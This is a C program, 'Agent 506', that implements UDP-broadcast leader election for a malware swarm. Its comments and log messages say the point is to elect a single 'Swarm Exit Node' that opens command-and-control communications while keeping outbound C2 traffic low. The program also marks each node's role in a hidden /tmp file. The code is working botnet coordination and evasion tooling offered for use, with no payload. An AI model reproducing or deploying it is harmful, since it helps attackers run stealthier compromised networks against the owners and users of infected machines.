#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>

/* Agent 506: Decentralized Leader Election.
   Implements a UDP broadcast Bully Algorithm to designate a 
   single Swarm Exit Node, minimizing outbound C2 traffic noise.
*/

#define ELECTION_PORT 53530
#define BROADCAST_IP "255.255.255.255"
#define HEARTBEAT_INTERVAL 3 // Seconds
#define TIMEOUT_THRESHOLD 10 // Seconds before calling new election

typedef enum { FOLLOWER, CANDIDATE, LEADER } NodeState;

int get_local_weight() {
    // Military Grade: Weight is calculated by hardware capability and IP.
    // For this primitive, we use a random seed mixed with PID to ensure uniqueness.
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec * getpid());
    return rand() % 10000;
}

int main() {
    int sock;
    struct sockaddr_in broadcast_addr, recv_addr;
    int broadcast_perm = 1;
    char buffer[256];
    
    int my_weight = get_local_weight();
    int highest_known_weight = my_weight;
    NodeState state = CANDIDATE;
    time_t last_heartbeat = time(NULL);

    printf("--- [AGENT 506: SWARM CONSENSUS PROTOCOL] ---\n");
    printf("[*] Node Weight initialized at: %d\n", my_weight);

    // Setup UDP Socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast_perm, sizeof(broadcast_perm));
    
    // Set socket to non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    memset(&broadcast_addr, 0, sizeof(broadcast_addr));
    broadcast_addr.sin_family = AF_INET;
    broadcast_addr.sin_port = htons(ELECTION_PORT);
    broadcast_addr.sin_addr.s_addr = inet_addr(BROADCAST_IP);

    // Bind for listening
    struct sockaddr_in listen_addr;
    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_port = htons(ELECTION_PORT);
    listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(sock, (struct sockaddr *)&listen_addr, sizeof(listen_addr));

    printf("[*] Entering Election Cycle...\n");

    while (1) {
        time_t current_time = time(NULL);

        // 1. Listen for incoming votes/heartbeats
        socklen_t addr_len = sizeof(recv_addr);
        int recv_len = recvfrom(sock, buffer, sizeof(buffer)-1, 0, (struct sockaddr *)&recv_addr, &addr_len);
        
        if (recv_len > 0) {
            buffer[recv_len] = '\0';
            int received_weight;
            
            // Parse packet: "VOTE:<weight>"
            if (sscanf(buffer, "VOTE:%d", &received_weight) == 1) {
                if (received_weight > highest_known_weight) {
                    highest_known_weight = received_weight;
                    state = FOLLOWER;
                    last_heartbeat = current_time;
                    printf("[\033[93mFOLLOWER\033[0m] Yielding to higher weight node (%d).\n", received_weight);
                }
            }
            // Parse packet: "LEADER:<weight>"
            else if (sscanf(buffer, "LEADER:%d", &received_weight) == 1) {
                if (received_weight >= my_weight) {
                    highest_known_weight = received_weight;
                    state = FOLLOWER;
                    last_heartbeat = current_time;
                }
            }
        }

        // 2. State Machine Logic
        if (state == LEADER) {
            // I am the leader. Broadcast my supremacy.
            snprintf(buffer, sizeof(buffer), "LEADER:%d", my_weight);
            sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&broadcast_addr, sizeof(broadcast_addr));
            sleep(HEARTBEAT_INTERVAL);
        } 
        else if (state == CANDIDATE) {
            // Campaigning for leader
            snprintf(buffer, sizeof(buffer), "VOTE:%d", my_weight);
            sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&broadcast_addr, sizeof(broadcast_addr));
            
            // If no one overrules me in 3 seconds, I assume leadership
            if (current_time - last_heartbeat > HEARTBEAT_INTERVAL) {
                state = LEADER;
                highest_known_weight = my_weight;
                printf("[\033[92mEXIT NODE ELECTED\033[0m] I am the Swarm Leader. Opening C2 comms.\n");
                
                // Write role to disk for other agents to read
                system("echo 'LEADER' > /tmp/.swarm_role");
            }
            sleep(1);
        } 
        else if (state == FOLLOWER) {
            system("echo 'FOLLOWER' > /tmp/.swarm_role");
            // If the leader dies, start a new election
            if (current_time - last_heartbeat > TIMEOUT_THRESHOLD) {
                printf("[\033[91mLEADER LOST\033[0m] Heartbeat timeout. Calling new election.\n");
                state = CANDIDATE;
                highest_known_weight = my_weight;
                last_heartbeat = current_time;
            }
            sleep(1);
        }
    }

    close(sock);
    return 0;
}
